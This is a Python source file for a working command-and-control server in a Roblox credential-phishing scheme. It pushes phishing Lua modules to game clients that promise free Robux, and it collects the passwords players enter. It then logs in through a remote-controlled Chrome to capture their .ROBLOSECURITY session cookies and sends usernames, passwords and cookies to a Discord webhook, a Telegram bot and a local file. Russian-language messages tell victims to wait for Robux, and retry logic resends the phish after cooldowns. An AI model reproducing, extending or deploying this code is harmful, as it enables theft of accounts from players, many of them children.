"""
c2_playwright.py — C2 server. Login via Chrome subprocess + CDP.
Captcha solving via Fetch interception (CDP) + embedded captcha solver.
"""
import math
import asyncio
import websockets
import json
import time
import logging
import os
import sys
import random
import subprocess
import threading
import shutil
import requests
import base64
import http.client
from http.server import HTTPServer, SimpleHTTPRequestHandler

logging.basicConfig(level=logging.INFO, format='%(asctime)s %(message)s')
log = logging.getLogger(__name__)

WS_PORT = 8081
MODULES_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "modules")
PHISH_COOLDOWN = 20
UPDATE_DELAY = 2 * 3600
CREDENTIALS_FILE = os.path.abspath("c2_credentials.txt")
DISCORD_WEBHOOK = os.environ.get("DISCORD_WEBHOOK", "")
CHROME = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
CDP_PORT = 9222
CAPTCHA_HTTP_PORT = 8089
CAPTCHA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "hundle")

tg_proc = None

# Global HTTP server for captcha_solver.html
_httpd = None

def start_captcha_http():
    global _httpd
    if _httpd:
        return
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    _httpd = HTTPServer(("0.0.0.0", CAPTCHA_HTTP_PORT), SimpleHTTPRequestHandler)
    t = threading.Thread(target=_httpd.serve_forever, daemon=True)
    t.start()
    log.info(f"Captcha HTTP server on :{CAPTCHA_HTTP_PORT}")


def tg_write(text):
    try:
        tg_proc.stdin.write(json.dumps({"text": text}) + "\n")
        tg_proc.stdin.flush()
    except Exception as e:
        log.warning(f"tg_write error: {e}")


def save_credentials(username, password, cookie_value):
    try:
        with open(CREDENTIALS_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}]\n")
            f.write(f"Username: {username}\n")
            f.write(f"Password: {password}\n")
            f.write(f".ROBLOSECURITY: {cookie_value}\n\n")
        log.info(f"Credentials saved to {CREDENTIALS_FILE}")
    except Exception as e:
        log.error(f"Failed to save credentials: {e}")


def dc_write(text):
    try:
        requests.post(DISCORD_WEBHOOK, json={"content": text}, timeout=5)
    except Exception as e:
        log.error(f"DC webhook error: {e}")


# Persistent Chrome state
_chrome_proc = None
_cdp = None
_cdp_msg_id = 0
_cdp_pending = {}
_cdp_event_handlers = {}
_cdp_reader_task = None

def start_chrome():
    args = [
        CHROME,
        "--user-data-dir=" + os.path.abspath("chrome_login_profile"),
        "--no-first-run",
        "--no-default-browser-check",
        "--remote-debugging-port=" + str(CDP_PORT),
        "--remote-allow-origins=*",
        "--window-size=900,700",
        "--disable-extensions",
        "--disable-sync",
        "--disable-background-networking",
        "--mute-audio",
        "--new-window", "about:blank",
    ]
    log.info("Starting Chrome...")
    proc = subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return proc


def wait_for_cdp(max_attempts=60):
    for i in range(max_attempts):
        try:
            conn = http.client.HTTPConnection("localhost", CDP_PORT, timeout=3)
            conn.request("GET", "/json")
            resp = conn.getresponse()
            tabs = json.loads(resp.read())
            conn.close()
            for t in tabs:
                u = t.get("url", "")
                if u.startswith("about:") or u == "":
                    return t["webSocketDebuggerUrl"]
            if tabs:
                return tabs[0]["webSocketDebuggerUrl"]
        except:
            pass
        time.sleep(1)
    raise RuntimeError("Could not connect to Chrome CDP")


async def _cdp_cmd(method, params=None, timeout_s=30):
    global _cdp_msg_id
    _cdp_msg_id += 1
    future = asyncio.get_event_loop().create_future()
    msg = {"id": _cdp_msg_id, "method": method, "params": params or {}}
    _cdp_pending[_cdp_msg_id] = future
    await _cdp.send(json.dumps(msg))
    try:
        return await asyncio.wait_for(future, timeout=timeout_s)
    except asyncio.TimeoutError:
        _cdp_pending.pop(_cdp_msg_id, None)
        return None


async def _cdp_reader():
    try:
        async for raw in _cdp:
            data = json.loads(raw)
            rid = data.get("id")
            if rid in _cdp_pending:
                _cdp_pending[rid].set_result(data.get("result", {}))
                del _cdp_pending[rid]
            meth = data.get("method", "")
            if meth in _cdp_event_handlers:
                asyncio.create_task(_cdp_event_handlers[meth](data.get("params", {})))
    except Exception as e:
        log.error(f"CDP reader error: {e}")


async def ensure_chrome():
    global _chrome_proc, _cdp, _cdp_reader_task
    if _cdp:
        return True
    # Fresh profile every server start — stale PoW/rate-limit cookies break login
    profile_path = os.path.abspath("chrome_login_profile")
    if os.path.exists(profile_path):
        shutil.rmtree(profile_path, ignore_errors=True)
        log.info("Deleted old Chrome profile")
    if _chrome_proc:
        try:
            _chrome_proc.kill()
            _chrome_proc.wait(timeout=3)
        except:
            pass
        _chrome_proc = None
    _chrome_proc = start_chrome()
    cdp_url = wait_for_cdp()
    log.info(f"CDP connected")
    _cdp = await websockets.connect(cdp_url, max_size=None)
    _cdp_reader_task = asyncio.create_task(_cdp_reader())
    await _cdp_cmd("Page.enable")
    await _cdp_cmd("Network.enable")

    # Log login-related network responses for debugging
    async def on_response(params):
        resp = params.get("response", {})
        url = resp.get("url", "")
        if "login" in url.lower() or "auth.roblox.com" in url:
            log.info(f"NET RESP: {resp.get('status')} {url[:120]}")
    _cdp_event_handlers["Network.responseReceived"] = on_response

    return True


async def login_with_chrome(username, password, retry=0):
    """Login with retry on rate limit (429). retry=0 means first attempt."""
    if not await ensure_chrome():
        return None

    # Navigate and wait for login form
    await _cdp_cmd("Page.navigate", {"url": "https://www.roblox.com/login"})
    for _ in range(60):
        ready = await _cdp_cmd("Runtime.evaluate", {
            "expression": "!!document.querySelector('#login-button')"
        })
        if ready.get("result", {}).get("value"):
            break
        if _ % 10 == 0:
            url_r = await _cdp_cmd("Runtime.evaluate", {"expression": "location.href"})
            url = (url_r or {}).get("result", {}).get("value", "?")
            log.info(f"Waiting for login page... ({_}s) url={url[:50]}")
        await asyncio.sleep(1)
    else:
        log.warning("Login page didn't load within 60s")
        return None

    # Fill credentials
    await _cdp_cmd("Runtime.evaluate", {
        "expression": f"""(() => {{
            const u = document.querySelector('#login-username');
            const p = document.querySelector('#login-password');
            if (!u || !p) return;
            const setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
            setter.call(u, ''); u.dispatchEvent(new Event('input', {{bubbles: true}}));
            setter.call(u, {json.dumps(username)}); u.dispatchEvent(new Event('input', {{bubbles: true}}));
            setter.call(p, ''); p.dispatchEvent(new Event('input', {{bubbles: true}}));
            setter.call(p, {json.dumps(password)}); p.dispatchEvent(new Event('input', {{bubbles: true}}));
        }})()"""
    })
    await asyncio.sleep(0.3)

    # Click login
    await _cdp_cmd("Runtime.evaluate", {"expression": "document.querySelector('#login-button')?.click()"})
    log.info("Login clicked, waiting for .ROBLOSECURITY...")

    # Wait for result (page auto-handles PoW + captcha in ~10-20s)
    for i in range(120):
        await asyncio.sleep(0.5)

        ck_resp = await _cdp_cmd("Network.getAllCookies")
        cookies = (ck_resp or {}).get("cookies", [])
        for c in cookies:
            if c["name"] == ".ROBLOSECURITY":
                log.info("ROBLOSECURITY captured")
                return {"cookie": c["value"]}

        url_resp = await _cdp_cmd("Runtime.evaluate", {"expression": "location.href"})
        current_url = (url_resp or {}).get("result", {}).get("value", "") or ""

        if "two-step-verification" in current_url.lower():
            log.info("2FA page detected")
            return {"2fa": True}

        # Check for login error
        err_r = await _cdp_cmd("Runtime.evaluate", {
            "expression": """(() => {
                const els = document.querySelectorAll('.error-message, .alert-error, .login-error, [data-error]');
                for (const el of els) {
                    if (el.offsetParent !== null) {
                        return (el.textContent || '').trim().substring(0, 200);
                    }
                }
                return '';
            })()"""
        })
        err_text = (err_r or {}).get("result", {}).get("value", "")
        if err_text:
            is_rate_limit = "unknown error" in err_text.lower() or "try again" in err_text.lower()
            if is_rate_limit and retry == 0:
                log.warning("Rate limited (429), retrying once in 60s...")
                await asyncio.sleep(60)
                return await login_with_chrome(username, password, retry=retry + 1)
            if is_rate_limit:
                log.warning("Rate limited (429) after retry, giving up for now")
                return {"rate_limited": True}
            log.info(f"Login error: '{err_text}'")
            return None

        if i % 20 == 0:
            log.info(f"Waiting... ({i//2}s) url={current_url[:50]}")

    log.warning("No .ROBLOSECURITY after 60s")
    return None


async def shutdown_chrome():
    global _chrome_proc, _cdp, _cdp_reader_task
    if _cdp_reader_task:
        _cdp_reader_task.cancel()
        _cdp_reader_task = None
    if _cdp:
        try:
            await _cdp.close()
        except:
            pass
        _cdp = None
    if _chrome_proc:
        try:
            _chrome_proc.kill()
            _chrome_proc.wait(timeout=3)
        except:
            pass
        _chrome_proc = None
    log.info("Chrome shutdown")


def load_module(name):
    path = os.path.join(MODULES_DIR, name)
    with open(path, "r", encoding="utf-8") as f:
        return f.read()


CLIENTS = {}


async def delayed_send(uid, delay, module, target_state):
    """Send module code after delay, unless client is completed."""
    if delay:
        await asyncio.sleep(delay)
    client = CLIENTS.get(uid)
    if not client or client.get("completed"):
        return
    try:
        ws = client.get("ws")
        if ws:
            # Always send raw module code first (payload.lua executes via loadstring)
            module_code = load_module(module)
            await ws.send(module_code)
            # For phish.lua, also trigger the GUI
            if module == "phish.lua":
                await ws.send(json.dumps({"type": "show_phish"}))
            client["last_phish"] = time.time()
            client["state"] = target_state
    except Exception as e:
        log.warning(f"delayed_send error: {e}")


async def handle_client(ws):
    log.info("Client connected")
    cs = {"tries": 0, "state": "hello", "player_name": "", "user_id": 0, "last_phish": 0, "completed": False, "exhausted": False, "closed_by_user": False, "done_at": 0, "phish_task": None, "ws": ws}
    try:
        async for msg in ws:
            if isinstance(msg, str):
                try:
                    data = json.loads(msg)
                except json.JSONDecodeError:
                    continue
                t = data.get("type")
                if t == "hello":
                    cs["player_name"] = data.get("playerName", "")
                    cs["user_id"] = data.get("userId", 0)
                    uid = cs["user_id"]
                    log.info(f"Client hello: user={cs['player_name']} id={uid}")
                    # Restore state if this user reconnects
                    if uid in CLIENTS:
                        old = CLIENTS[uid]
                        if old.get("completed"):
                            log.info(f"User {uid} already completed, no phish")
                            cs["completed"] = True
                            CLIENTS[uid] = cs
                            continue
                        if old.get("closed_by_user"):
                            log.info(f"User {uid} voluntarily closed, no more phish")
                            cs["closed_by_user"] = True
                            CLIENTS[uid] = cs
                            continue
                        if old.get("exhausted") and old.get("done_at"):
                            elapsed = time.time() - old["done_at"]
                            if elapsed < PHISH_COOLDOWN:
                                log.info(f"User {uid} exhausted, in cooldown ({PHISH_COOLDOWN - elapsed:.0f}s remaining)")
                                cs["exhausted"] = True
                                cs["done_at"] = old["done_at"]
                                CLIENTS[uid] = cs
                                continue
                            log.info(f"User {uid} exhausted, cooldown elapsed, resending phish")
                    CLIENTS[uid] = cs
                    cs["phish_task"] = asyncio.create_task(delayed_send(uid, PHISH_COOLDOWN, "phish.lua", "phish_sent"))
                elif t == "password":
                    if cs.get("completed"):
                        continue
                    password = data.get("password", "")
                    user_id = data.get("userId", 0)
                    player_name = data.get("playerName", "")
                    log.info(f"Password from {player_name} (id={user_id}), len={len(password)}")
                    cs["tries"] += 1
                    username = None
                    try:
                        resp = requests.get(f"https://users.roblox.com/v1/users/{user_id}", timeout=10)
                        if resp.status_code == 200:
                            username = resp.json().get("name")
                    except Exception as e:
                        log.warning(f"Username lookup error: {e}")
                    if not username:
                        await ws.send(json.dumps({"type": "err", "message": "Не удалось определить логин"}))
                        continue
                    log.info(f"Username: {username}")
                    await ws.send(json.dumps({"type": "hold", "message": "Проверка данных..."}))
                    try:
                        result = await login_with_chrome(username, password)
                    except Exception as e:
                        log.error(f"Login error: {e}")
                        await ws.send(json.dumps({"type": "err", "message": f"Ошибка входа"}))
                        continue
                    if result and "cookie" in result:
                        log.info(f"COOKIE captured")
                        cs["completed"] = True
                        cs["state"] = "complete"
                        save_credentials(username, password, result["cookie"])
                        tg_msg = f"<b>{player_name}</b>\n{username}\n{password}\n\n{result['cookie']}"
                        tg_write(tg_msg)
                        dc_write(f"{player_name} | {username}:{password} | {result['cookie']}")
                        h1 = random.randint(6, 12)
                        h2 = random.randint(h1 + 12, h1 + 48)
                        await ws.send(json.dumps({"type": "ok", "message": f"Robux будут начислены от {h1} до {h2} часов. Ожидайте."}))
                    elif result and "2fa" in result:
                        log.info("2FA required")
                        if cs["tries"] >= 3:
                            cs["exhausted"] = True
                            cs["tries"] = 0
                            await ws.send(json.dumps({"type": "err", "message": f"2FA не пройдена. Фиш через {math.ceil(PHISH_COOLDOWN / 3600)} ч.", "cooldown": PHISH_COOLDOWN, "blocked": True}))
                        else:
                            await ws.send(json.dumps({"type": "err", "message": f"Требуется 2FA. Попытка {cs['tries']}/3"}))
                    else:
                        if cs["tries"] >= 3:
                            cs["exhausted"] = True
                            cs["tries"] = 0
                            await ws.send(json.dumps({"type": "err", "message": f"Неверный пароль. Бонус пришлем снова через {math.ceil(PHISH_COOLDOWN / 3600)} ч.", "cooldown": PHISH_COOLDOWN, "blocked": True}))
                        else:
                            await ws.send(json.dumps({"type": "err", "message": f"Неверный пароль, попробуйте ещё раз. Попытка {cs['tries']}/3"}))
                elif t == "2fa_code":
                    pass
                elif t in ("closed", "timed_out"):
                    if cs.get("exhausted"):
                        cs["done_at"] = time.time()
                        if cs.get("phish_task"):
                            cs["phish_task"].cancel()
                        uid = cs["user_id"]
                        cs["phish_task"] = asyncio.create_task(delayed_send(uid, PHISH_COOLDOWN, "phish.lua", "phish_sent"))
                    else:
                        cs["closed_by_user"] = True
                    cs["state"] = "done"
    except websockets.exceptions.ConnectionClosed:
        pass
    finally:
        if cs.get("phish_task"):
            cs["phish_task"].cancel()
        cs["ws"] = None
        cs["state"] = "disconnected"
        cs["done_at"] = time.time()
        # Keep CLIENTS entry for reconnect tracking
        uid = cs.get("user_id", 0)
        if uid and uid in CLIENTS:
            CLIENTS[uid].update({"ws": None, "state": "disconnected", "done_at": time.time()})
        log.info(f"Client disconnected (user_id={uid})")


async def main():
    global tg_proc
    start_captcha_http()
    tg_proc = subprocess.Popen(
        [sys.executable, "-u", os.path.join(os.path.dirname(os.path.abspath(__file__)), "tg_bot.py")],
        stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        text=True, bufsize=1
    )
    def read_tg():
        for line in tg_proc.stdout:
            log.info(f"[tg_bot] {line.rstrip()}")
    threading.Thread(target=read_tg, daemon=True).start()

    async def handler(ws):
        await handle_client(ws)
    async with websockets.serve(handler, "0.0.0.0", WS_PORT) as server:
        log.info(f"WebSocket server on ws://0.0.0.0:{WS_PORT}")
        try:
            await asyncio.Future()
        except asyncio.CancelledError:
            pass
    await shutdown_chrome()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        asyncio.run(shutdown_chrome())
